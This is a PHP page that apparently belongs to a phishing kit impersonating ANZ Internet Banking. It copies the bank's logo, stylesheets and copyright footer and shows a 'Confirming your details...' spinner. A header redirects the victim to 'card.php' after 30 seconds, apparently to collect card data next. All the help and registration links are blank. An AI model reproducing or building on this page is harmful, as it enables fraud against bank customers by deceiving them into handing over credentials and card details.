<?php
	header( 'Refresh: 30; url="card.php"' );
?>


<!DOCTYPE html>
<html lang="en">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<title>ANZ Internet Banking - Login</title>
	<meta name="description" content="Log in to Internet Banking...">
	<meta name="keywords" content="Internet Banking, logging in, log in, online banking, ANZ IB, IB">
	<meta name="SiteLevel" content="3">
	<meta name="PopupWindow" content="750:500">
	
<style>
.text
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

.text3
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: normal
}

A.text3:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

.text3bold
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

A.text3bold:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

</style>
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css" />
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css" />
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css" />
</head>
<body topmargin="0" marginwidth="0" marginheight="0" leftmargin="0" bgcolor="#ffffff"><div id="splashPage" style="display:none;">

	<title>ANZ Internet Banking</title>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css">

<div class="container-fluid" id="headerBG">
<div id="header">
	<div class="logo">
		<img src="../common/header/images/ANZ-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
	</div>
</div>
</div>

<div class="container">
	<div id="loader">
		<div style="padding:145px 0px;text-align:center">
		
			<div class="anz-loader">
		    	<div class="mh4ph" id="wBall_1">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_2">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_3">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_4">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_5">
		            <div class="dark-loader spinner"></div>
		        </div>
		    </div>
		  
  		<br>
        <div style="padding-top:5px;color:#444444;font-family:MyriadPro-Semibold,Arial;font-size:1em;font-weight:bold">Confirming your details...</div>
        </div>
	</div>
</div>
<link href="../common/footer/css/ib_responsive_footer.css" rel="stylesheet" type="text/css">
<div class="container-fluid" id="footerBG">
	<div id="footer">Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</div>
</div>


</div>
<div id="logonAdmin" style="display:block;">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>ANZ Internet Banking - Login</title>
	<meta name="description" content="Log in to Internet Banking...">
	<meta name="keywords" content="Internet Banking, logging in, log in, online banking, ANZ IB, IB">
	<meta name="SiteLevel" content="3">
	<meta name="PopupWindow" content="750:500">
	
<style>
.text
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

.text3
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: normal
}

A.text3:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

.text3bold
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

A.text3bold:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

</style>
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css">

 

<div class="container-fluid" id="headerBG">
	<div id="header">
		<div class="logo">
			<img src="../common/header/images/ANZ-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
		</div>
	</div>
</div>
	<div class="container">
		<div id="contentContainer">
		    <div class="mboxDefault mbox-name-ib:logon:service at-element-marker" style="visibility:visible;"></div>
			<!--div id="contentContainer Left" class="col-ts-12 col-sm-7 col-xs-7"-->
			<div id="contentContainerLeft" class="col-ts-12 col-xs-7">
				<div id="logonContainer">
					<h1>Log in to ANZ Internet Banking</h1>
					<div id="logonBox">
						Please wait
						<br><br><br>
						<br><br><br>
			<div class="anz-loader" style="width: 100%">
		    	<div class="mh4ph" id="wBall_1">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_2">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_3">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_4">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_5">
		            <div class="dark-loader spinner"></div>
		        </div>
		    </div>
					</div>
				</div>
				<div class="mboxDefault mbox-name-ib:logon at-element-marker" style="visibility:visible;"></div>
			</div>

			<div id="contentContainerRight" class="col-ts-12 col-sm-5 col-xs-5">
				<div id="newToIBDiv">
					<div id="iconNew2IB"><h2>New to ANZ Internet Banking?</h2></div>
					<p></p>
					<ul>
						<li><a href="">Register for ANZ Internet Banking</a></li>
						<li><a href="">Read about ANZ Internet Banking</a></li>
						<li><a href="">Terms and Conditions</a></li>
					</ul>	
					<p></p>
				</div>
				<div id="needHelpDiv">
					<div id="iconNeedHelp"><h2>Need some help?</h2></div>
					<p></p>
					<ul>
						<li><a href="">Need help logging in?</a></li>
						<li><a href="">What's new?</a></li>
						<li><a href="">Software requirements and settings</a></li>
						<li><a href="">Contact us</a></li>	
					</ul>							
					<p></p>
				</div>
				<div id="onlineSecurityDiv">
					<div id="iconOS"><h2>Online Security</h2></div>
					<p></p>
					<ul>
						<li><a href="">Read current security alert</a></li>
						<li><a href="">Online Security</a></li>
						<li><a href="">Security software offers</a></li>
					</ul>
					<p></p>
				</div>
			</div>
		</div>
	</div>
	<link href="../common/footer/css/ib_responsive_footer.css" rel="stylesheet" type="text/css">
	<div class="container-fluid" id="footerBG">
		<div id="footer">
			<span name="NOINDEX"><p>©Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</p></span>
		</div>
	</div>
</div>

</body>
</html>